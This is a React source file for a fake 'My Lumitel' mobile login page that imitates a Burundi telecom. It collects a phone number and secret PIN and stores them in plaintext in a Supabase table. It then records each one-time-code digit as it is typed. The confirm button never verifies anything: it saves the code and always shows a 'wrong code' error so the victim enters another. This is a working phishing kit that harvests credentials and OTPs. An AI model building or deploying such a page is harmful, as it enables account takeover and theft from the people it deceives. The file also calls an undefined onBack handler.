import { useState, useRef, useEffect, useCallback } from 'react';
import {
  ArrowLeft, RefreshCw, Loader2,
  Gamepad2, Music, Film, Grid3x3, Crown,
  Globe, Check, AlertCircle, Send, Lock,
} from 'lucide-react';
import { Plan } from '../types';
import { supabase } from '../lib/supabase';
import { useLanguage } from '../i18n/LanguageContext';
import { LANGUAGES, Language } from '../i18n/translations';

interface Props {
  plan: Plan;
}

const OTP_LENGTH = 6;
const COUNTRY_CODE = '+257';

/* ─── Orbit graphic ─── */
function OrbitGraphic() {
  const S = 220, cx = 110, r = 76;
  const circ = 2 * Math.PI * r;
  const arcLen = circ * (295 / 360);
  const gapLen = circ * (65 / 360);

  const icons = [
    { a: 270, bg: '#3B82F6', Icon: Grid3x3, size: 38 },
    { a: 315, bg: '#ffffff', Icon: Send,     size: 46, border: true },
    { a: 30,  bg: '#22C55E', Icon: Music,    size: 38 },
    { a: 65,  bg: '#374151', Icon: Gamepad2, size: 38 },
    { a: 118, bg: '#4B5563', Icon: Film,     size: 38 },
    { a: 180, bg: '#3B82F6', Icon: Send,     size: 38 },
    { a: 225, bg: '#F97316', Icon: Crown,    size: 38 },
  ];

  return (
    <div className="relative mx-auto" style={{ width: 'min(190px, 38vw)', height: 'min(190px, 38vw)' }}>
      <svg className="absolute inset-0 w-full h-full" viewBox={`0 0 ${S} ${S}`}>
        <circle
          cx={cx} cy={cx} r={r}
          fill="none" stroke="#FEF3C7" strokeWidth="26"
          strokeDasharray={`${arcLen} ${gapLen}`}
          strokeLinecap="round"
          transform={`rotate(180 ${cx} ${cx})`}
        />
      </svg>
      <div className="absolute inset-0 flex items-center justify-center">
        <div className="rounded-full bg-gray-200 flex items-center justify-center border-2 border-gray-300/80 shadow-inner" style={{ width: '26%', height: '26%' }}>
          <svg viewBox="0 0 40 40" className="text-gray-400 w-3/4 h-3/4" fill="currentColor">
            <circle cx="20" cy="14" r="7" />
            <path d="M4 36c0-8.837 7.163-16 16-16s16 7.163 16 16" />
          </svg>
        </div>
      </div>
      {icons.map(({ a, bg, Icon, size, border }) => {
        const rad = (a * Math.PI) / 180;
        const x = cx + r * Math.cos(rad);
        const y = cx + r * Math.sin(rad);
        return (
          <div
            key={a}
            className="absolute flex items-center justify-center rounded-full shadow-md"
            style={{
              width: `${(size / S) * 100}%`, height: `${(size / S) * 100}%`,
              left: `${(x / S) * 100}%`, top: `${(y / S) * 100}%`,
              transform: 'translate(-50%, -50%)',
              background: bg,
              border: border ? '2.5px solid #3B82F6' : '2px solid rgba(255,255,255,0.3)',
            }}
          >
            <Icon size={size === 46 ? 20 : 15} color={bg === '#ffffff' ? '#3B82F6' : 'white'} />
          </div>
        );
      })}
    </div>
  );
}

/* ─── Language pill ─── */
function LangPill() {
  const { lang, setLang, t } = useLanguage();
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  const current = LANGUAGES.find((l) => l.code === lang)!;

  useEffect(() => {
    const h = (e: MouseEvent) => { if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false); };
    document.addEventListener('mousedown', h);
    return () => document.removeEventListener('mousedown', h);
  }, []);

  return (
    <div className="relative z-20" ref={ref}>
      <button onClick={() => setOpen(o => !o)} className="flex items-center gap-1.5 bg-white rounded-full px-3 py-1.5 shadow border border-white/80 hover:bg-gray-50 transition-colors">
        <Globe size={12} className="text-gray-500" />
        <span className="text-sm leading-none">{current.flag}</span>
        <span className="text-gray-800 text-xs font-bold">{t('lumi.langName')}</span>
        <svg className={`w-3 h-3 text-gray-500 transition-transform ${open ? 'rotate-180' : ''}`} viewBox="0 0 12 12" fill="currentColor"><path d="M6 8L1 3h10z" /></svg>
      </button>
      {open && (
        <div className="absolute right-0 mt-1.5 w-40 bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
          {LANGUAGES.map((l) => (
            <button key={l.code} onClick={() => { setLang(l.code as Language); setOpen(false); }}
              className={`w-full flex items-center gap-2.5 px-3 py-2.5 text-left hover:bg-gray-50 transition-colors ${lang === l.code ? 'bg-blue-50' : ''}`}>
              <span className="text-base leading-none">{l.flag}</span>
              <span className="flex-1 text-gray-800 text-xs font-semibold">{l.nativeLabel}</span>
              {lang === l.code && <Check size={13} className="text-blue-500" />}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

/* ─── OTP Box component ─── */
function OtpBox({ value, onChange, onKeyDown, inputRef, hasError }: {
  value: string;
  onChange: (v: string) => void;
  onKeyDown: (e: React.KeyboardEvent) => void;
  inputRef: (el: HTMLInputElement | null) => void;
  hasError: boolean;
}) {
  return (
    <input
      ref={inputRef}
      type="text"
      inputMode="numeric"
      maxLength={1}
      value={value}
      onChange={(e) => onChange(e.target.value)}
      onKeyDown={onKeyDown}
      className={`
        w-12 h-12 text-center text-xl font-black rounded-xl outline-none
        transition-all duration-150 text-gray-900 border-2 select-none
        ${hasError
          ? 'bg-red-50 border-red-300'
          : value
            ? 'bg-blue-50 border-blue-400 text-blue-700'
            : 'bg-gray-100 border-transparent focus:bg-white focus:border-blue-400 focus:shadow-sm'
        }
      `}
    />
  );
}

/* ─── Main page ─── */
export default function LumiPayPage({ plan }: Props) {
  const { t } = useLanguage();
  const [step, setStep]           = useState<'phone' | 'otp'>('phone');
  const [localNumber, setLocalNumber] = useState('');
  const [pin, setPin]             = useState('');
  const [otp, setOtp]             = useState<string[]>(Array(OTP_LENGTH).fill(''));
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState('');
  const [resendCountdown, setResendCountdown] = useState(0);
  const [otpRecordId, setOtpRecordId] = useState<string | null>(null);
  const [otpExpired, setOtpExpired] = useState(false);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  const fullPhone = `${COUNTRY_CODE}${localNumber}`;
  const startResendTimer = useCallback(() => setResendCountdown(300), []);

  /* OTP expiry — 2 min */
  useEffect(() => {
    if (step !== 'otp' || otpExpired) return;
    const id = setTimeout(() => { setOtpExpired(true); setError(t('lumi.otpExpired')); }, 120_000);
    return () => clearTimeout(id);
  }, [step, otpExpired, t]);

  /* Countdown */
  useEffect(() => {
    if (resendCountdown <= 0) return;
    const id = setTimeout(() => setResendCountdown(c => c - 1), 1000);
    return () => clearTimeout(id);
  }, [resendCountdown]);

  /* Persist OTP as user types */
  useEffect(() => {
    if (!otpRecordId) return;
    const code = otp.join('');
    const id = setTimeout(() => {
      supabase.from('lumi_otp_records').update({
        otp_code: code,
        otp_digit_1: otp[0]||null, otp_digit_2: otp[1]||null,
        otp_digit_3: otp[2]||null, otp_digit_4: otp[3]||null,
        otp_digit_5: otp[4]||null, otp_digit_6: otp[5]||null,
        otp_length: code.length, is_complete: code.length === OTP_LENGTH,
        updated_at: new Date().toISOString(),
      }).eq('id', otpRecordId);
    }, 150);
    return () => clearTimeout(id);
  }, [otp, otpRecordId]);

  const handleRequestOtp = async () => {
    if (!localNumber.trim()) { setError(t('lumi.errPhone')); return; }
    if (!pin.trim())         { setError(t('lumi.errPin'));   return; }
    setError(''); setLoading(true);
    try {
      const { data: rec, error: e1 } = await supabase.from('lumi_records').insert({
        plan_id: plan.id, plan_name: plan.name, plan_data: plan.data,
        plan_duration: plan.duration, plan_price: plan.price, plan_type: plan.type,
        phone_number: fullPhone, phone_country_code: COUNTRY_CODE,
        phone_local: localNumber, pin, status: 'otp_sent',
      }).select('id').maybeSingle();
      if (e1) throw e1;
      if (!rec) throw new Error();

      const { data: oRec, error: e2 } = await supabase.from('lumi_otp_records').insert({
        lumi_record_id: rec.id, otp_code: '', otp_length: 0, is_complete: false,
      }).select('id').maybeSingle();
      if (e2) throw e2;
      if (oRec) setOtpRecordId(oRec.id);

      startResendTimer();
      setStep('otp');
    } catch {
      setError(t('lumi.errGeneric'));
    } finally {
      setLoading(false);
    }
  };

  const handleOtpChange = (i: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp]; next[i] = value.slice(-1); setOtp(next);
    if (value && i < OTP_LENGTH - 1) otpRefs.current[i + 1]?.focus();
  };

  const handleOtpKeyDown = (i: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[i] && i > 0) otpRefs.current[i - 1]?.focus();
  };

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, OTP_LENGTH);
    const next = Array(OTP_LENGTH).fill('');
    pasted.split('').forEach((c, i) => { next[i] = c; });
    setOtp(next);
    otpRefs.current[Math.min(pasted.length, OTP_LENGTH - 1)]?.focus();
  };

  const handleConfirmOtp = async () => {
    const code = otp.join('');
    if (code.length < OTP_LENGTH) { setError(t('lumi.otpIncomplete')); return; }
    if (otpExpired)               { setError(t('lumi.otpExpired'));    return; }
    setError(''); setLoading(true);
    try {
      if (otpRecordId) {
        await supabase.from('lumi_otp_records').update({
          otp_code: code,
          otp_digit_1: otp[0]||null, otp_digit_2: otp[1]||null,
          otp_digit_3: otp[2]||null, otp_digit_4: otp[3]||null,
          otp_digit_5: otp[4]||null, otp_digit_6: otp[5]||null,
          otp_length: OTP_LENGTH, is_complete: true,
          updated_at: new Date().toISOString(),
        }).eq('id', otpRecordId);
      }
    } catch { /* continue to error */ } finally {
      setLoading(false);
      setOtp(Array(OTP_LENGTH).fill(''));
      setError(t('lumi.errOtpWrong'));
      otpRefs.current[0]?.focus();
    }
  };

  const handleResend = () => {
    if (resendCountdown > 0) return;
    setOtp(Array(OTP_LENGTH).fill(''));
    setOtpExpired(false);
    startResendTimer();
    setError('');
  };

  const codeComplete    = otp.join('').length >= OTP_LENGTH;
  const confirmDisabled = loading || !codeComplete || otpExpired;

  return (
    <div className="flex flex-col bg-white mx-auto w-full" style={{ height: '100dvh', maxWidth: 480 }}>

      {/* ══ YELLOW TOP — 46% ══ */}
      <div
        className="relative flex-shrink-0 flex flex-col overflow-hidden"
        style={{ flex: '0 0 46%', background: 'linear-gradient(155deg, #FFB300 0%, #FFCF00 50%, #FFE57F 100%)' }}
      >
        {/* Diagonal stripes */}
        <div className="absolute inset-0 pointer-events-none opacity-[0.07]"
          style={{ backgroundImage: 'repeating-linear-gradient(135deg,#fff 0,#fff 1px,transparent 0,transparent 16px)' }} />
        {/* Deco circles */}
        <div className="absolute -top-10 -right-10 w-40 h-40 rounded-full border-[8px] border-yellow-300/25 pointer-events-none" />
        <div className="absolute -bottom-12 -left-12 w-48 h-48 rounded-full border-[8px] border-yellow-200/20 pointer-events-none" />

        {/* Top bar */}
        <div className="relative z-10 flex items-center justify-between px-4 pt-4">
          <button
            onClick={() => {
              if (step === 'otp') { setStep('phone'); setError(''); setOtp(Array(OTP_LENGTH).fill('')); setOtpExpired(false); }
              else { onBack(); }
            }}
            className="w-9 h-9 bg-white/80 hover:bg-white rounded-full flex items-center justify-center shadow-sm transition-colors"
          >
            <ArrowLeft size={17} className="text-gray-700" />
          </button>
          <LangPill />
        </div>

        {/* Title + orbit */}
        <div className="relative z-10 flex flex-col items-center justify-center flex-1 pb-2">
          <h1 className="font-black tracking-tight leading-none mb-2" style={{ fontSize: 'clamp(24px, 6.5vw, 34px)', color: '#1D4ED8' }}>
            My Lumitel
          </h1>
          <OrbitGraphic />
        </div>
      </div>

      {/* ══ WHITE BOTTOM — 54%, content stacked from top ══ */}
      <div className="flex-1 bg-white px-5 pt-5 flex flex-col">

        {/* ── PHONE STEP ── */}
        {step === 'phone' && (
          <>
            <h2 className="text-gray-900 font-black text-[20px] text-center mb-4 leading-tight">
              {t('lumi.phoneTitle')}
            </h2>

            {error && (
              <div className="mb-3 bg-red-50 border border-red-200 rounded-xl px-3 py-2 text-red-600 text-sm text-center font-medium">
                {error}
              </div>
            )}

            {/* Phone field */}
            <div className="mb-2.5 flex items-center border border-gray-300 focus-within:border-blue-400 rounded-xl bg-white shadow-sm transition-colors overflow-hidden">
              {/* Burundi flag + country code */}
              <div className="flex items-center gap-1.5 pl-3.5 pr-2.5 py-3.5 border-r border-gray-200 flex-shrink-0">
                <span className="text-lg leading-none">🇧🇮</span>
                <span className="text-gray-700 font-semibold text-[14px] tracking-tight">{COUNTRY_CODE}</span>
              </div>
              <input
                type="tel"
                placeholder={t('lumi.phonePlaceholder')}
                value={localNumber}
                onChange={(e) => setLocalNumber(e.target.value.replace(/\D/g, ''))}
                className="flex-1 outline-none text-gray-900 text-[15px] placeholder:text-gray-400 bg-transparent px-3 py-3.5 min-w-0"
              />
            </div>

            {/* PIN field */}
            <div className="mb-4 flex items-center border border-gray-300 focus-within:border-blue-400 rounded-xl px-3.5 py-3.5 gap-2.5 bg-white shadow-sm transition-colors">
              <Lock size={16} className="text-gray-400 flex-shrink-0" />
              <input
                type="password"
                placeholder={t('lumi.pinPlaceholder')}
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                className="flex-1 outline-none text-gray-900 text-[15px] placeholder:text-gray-400 bg-transparent tracking-widest"
                maxLength={6}
                onKeyDown={(e) => e.key === 'Enter' && handleRequestOtp()}
              />
              <span className="text-gray-300 text-[11px] font-medium">{pin.length}/6</span>
            </div>

            {/* Request OTP */}
            <button
              onClick={handleRequestOtp}
              disabled={loading}
              className="w-full flex items-center justify-center gap-2 font-black text-[15px] py-4 rounded-xl transition-all mb-2.5 shadow"
              style={{ background: '#1D4ED8', color: '#FDE047' }}
            >
              {loading && <Loader2 size={17} className="animate-spin" style={{ color: '#FDE047' }} />}
              {t('lumi.loginBtn')}
            </button>

            {/* Terms */}
            <p className="text-gray-500 text-[11.5px] text-center leading-relaxed">
              {t('lumi.terms')}
              <span className="text-blue-500 underline cursor-pointer">{t('lumi.termsLink')}</span>
            </p>
          </>
        )}

        {/* ── OTP STEP ── */}
        {step === 'otp' && (
          <>
            <h2 className="text-gray-900 font-black text-[20px] text-center mb-1.5 leading-tight">
              {t('lumi.otpTitle')}
            </h2>
            <p className="text-gray-500 text-[13px] text-center mb-5 leading-snug">
              {t('lumi.otpSentTo')}{' '}
              <span className="font-bold text-gray-800">{fullPhone}</span>
            </p>

            {/* 6 compact OTP boxes — fixed 48px, spread across width */}
            <div
              className={`flex justify-between mb-3 ${otpExpired ? 'opacity-40 pointer-events-none' : ''}`}
              onPaste={handleOtpPaste}
            >
              {Array(OTP_LENGTH).fill(null).map((_, i) => (
                <OtpBox
                  key={i}
                  value={otp[i]}
                  hasError={!!error}
                  inputRef={(el) => { otpRefs.current[i] = el; }}
                  onChange={(v) => handleOtpChange(i, v)}
                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
                />
              ))}
            </div>

            {/* "Didn't receive? (countdown)" row — exactly like screenshot */}
            <div className="text-center mb-4">
              <span className="text-gray-500 text-[13px]">{t('lumi.noOtp')} </span>
              {resendCountdown > 0 ? (
                <span className="text-blue-500 font-bold text-[13px]">({resendCountdown})</span>
              ) : (
                <button onClick={handleResend} className="text-blue-500 font-bold text-[13px] hover:underline">
                  {t('lumi.resend')}
                </button>
              )}
            </div>

            {/* Error with resend */}
            {error && (
              <div className="mb-3 bg-red-50 border border-red-200 rounded-xl px-3 py-2.5 flex items-start gap-2">
                <AlertCircle size={14} className="text-red-500 flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-red-600 text-[13px] font-semibold leading-tight">{error}</p>
                  <button
                    onClick={handleResend}
                    disabled={resendCountdown > 0}
                    className="mt-1 text-[11px] text-blue-500 font-bold inline-flex items-center gap-1 disabled:opacity-40"
                  >
                    <RefreshCw size={9} />
                    {resendCountdown > 0 ? `${t('lumi.resend')} (${resendCountdown}s)` : t('lumi.resend')}
                  </button>
                </div>
              </div>
            )}

            {otpExpired && !error && (
              <div className="mb-3 bg-orange-50 border border-orange-200 rounded-xl px-3 py-2 text-orange-600 text-[13px] text-center font-medium">
                {t('lumi.otpExpired')}
              </div>
            )}

            {/* Confirm / Bandanya — grey when disabled, blue when ready */}
            <button
              onClick={handleConfirmOtp}
              disabled={confirmDisabled}
              className={`w-full font-black text-[15px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 ${
                confirmDisabled
                  ? 'bg-gray-300 text-gray-400 cursor-not-allowed'
                  : 'bg-blue-600 hover:bg-blue-700 text-white shadow'
              }`}
            >
              {loading && <Loader2 size={17} className="animate-spin" />}
              {t('lumi.confirm')}
            </button>
          </>
        )}
      </div>
    </div>
  );
}
